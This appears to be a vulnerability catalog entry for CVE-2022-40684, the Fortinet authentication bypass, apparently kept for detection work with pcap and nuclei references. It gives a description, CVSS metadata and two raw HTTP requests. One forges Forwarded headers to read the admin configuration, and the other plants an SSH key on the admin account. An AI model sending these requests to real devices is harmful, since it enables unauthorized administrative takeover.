---
layout: post
cve_id: CVE-2022-40684
title: Fortinet - Authentication Bypass
pcap: true
pcap_path: /pcaps/2022/CVE-2022-40684.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-40684.yaml
snort2_rule: N/A
snort3_rule: N/A
author: Shockwave,nagli,carlosvieira
severity: critical
impact: 'Successful exploitation of this vulnerability allows an attacker to bypass
  authentication and gain unauthorized access to the affected device.

  '
remediation: 'Apply the necessary security patches or firmware updates provided by
  Fortinet to mitigate this vulnerability.

  '
reference:
- https://github.com/horizon3ai/CVE-2022-40684/blob/master/CVE-2022-40684.py
- https://securityonline.info/researchers-have-developed-cve-2022-40684-poc-exploit-code/
- https://socradar.io/what-do-you-need-to-know-about-fortinet-critical-authentication-bypass-vulnerability-cve-2022-40684/
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40684
- https://nvd.nist.gov/vuln/detail/CVE-2022-40684
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-40684
  cwe-id: CWE-287
  epss-score: 0.94427
  epss-percentile: 0.99982
  cpe: cpe:2.3:a:fortinet:fortiproxy:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: fortinet
  product: fortiproxy
tags:
- cve
- cve2022
- fortinet
- fortigate
- fortios
- fortiproxy
- auth-bypass
- kev
- intrusive
- vkev
- vuln
---

## üîç Vulnerability Description
Fortinet contains an authentication bypass vulnerability via using an alternate path or channel in FortiOS 7.2.0 through 7.2.1 and 7.0.0 through 7.0.6, FortiProxy 7.2.0 and 7.0.0 through 7.0.6, and FortiSwitchManager 7.2.0 and 7.0.0. An attacker can perform operations on the administrative interface via specially crafted HTTP or HTTPS requests, thus making it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.


## üåê HTTP Request
```nohighlight
GET /api/v2/cmdb/system/admin HTTP/1.1
Host: www.victim.com
User-Agent: Node.js
Connection: close
Forwarded: by="[127.0.0.1]:1337";for="[127.0.0.1]:1337";proto=http;host=
X-Forwarded-Vdom: root
Accept-Encoding: gzip
```

```nohighlight
PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
Host: www.victim.com
User-Agent: Report Runner
Connection: close
Content-Length: 56
Content-Type: application/json
Forwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;
Accept-Encoding: gzip

{
  "ssh-public-key1":"38FCTPTBYhLwlP4g0m88n5g3wCq"
}
```

